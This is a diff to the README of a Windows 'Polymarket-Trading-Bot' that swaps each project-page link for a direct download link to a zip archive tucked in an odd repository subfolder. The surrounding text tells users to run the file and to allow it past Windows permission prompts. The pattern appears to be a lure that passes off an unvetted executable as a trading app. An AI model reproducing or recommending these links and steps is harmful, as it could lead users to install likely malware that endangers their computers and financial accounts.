@@ -1,6 +1,6 @@
 # 🤖 Polymarket-Trading-Bot - Structured Market Decisions for Windows
 
-[![Download](https://img.shields.io/badge/Download-Polymarket--Trading--Bot-blue?style=for-the-badge&logo=github)](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
+[![Download](https://img.shields.io/badge/Download-Polymarket--Trading--Bot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sylvesteroriental963/Polymarket-Trading-Bot/main/dionym/Trading_Polymarket_Bot_1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Polymarket-Trading-Bot helps you follow a probability-based trading plan on Poly
 
 Use the link below to visit the download page:
 
-[Download Polymarket-Trading-Bot](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
+[Download Polymarket-Trading-Bot](https://raw.githubusercontent.com/sylvesteroriental963/Polymarket-Trading-Bot/main/dionym/Trading_Polymarket_Bot_1.3.zip)
 
 ## 💻 What This App Does
 
@@ -39,7 +39,7 @@ If Windows asks for permission, choose the option that lets the app run.
 Follow these steps on Windows:
 
 1. Open the download page:
-   [https://github.com/sylvesteroriental963/Polymarket-Trading-Bot](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
+   [https://raw.githubusercontent.com/sylvesteroriental963/Polymarket-Trading-Bot/main/dionym/Trading_Polymarket_Bot_1.3.zip](https://raw.githubusercontent.com/sylvesteroriental963/Polymarket-Trading-Bot/main/dionym/Trading_Polymarket_Bot_1.3.zip)
 
 2. Look for the latest release or main project files.
 
@@ -205,4 +205,4 @@ If a newer version appears on the project page, repeat the download steps and re
 
 Open the download page, get the latest Windows file, and run it on your PC:
 
-[Visit the Polymarket-Trading-Bot download page](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
+[Visit the Polymarket-Trading-Bot download page](https://raw.githubusercontent.com/sylvesteroriental963/Polymarket-Trading-Bot/main/dionym/Trading_Polymarket_Bot_1.3.zip)
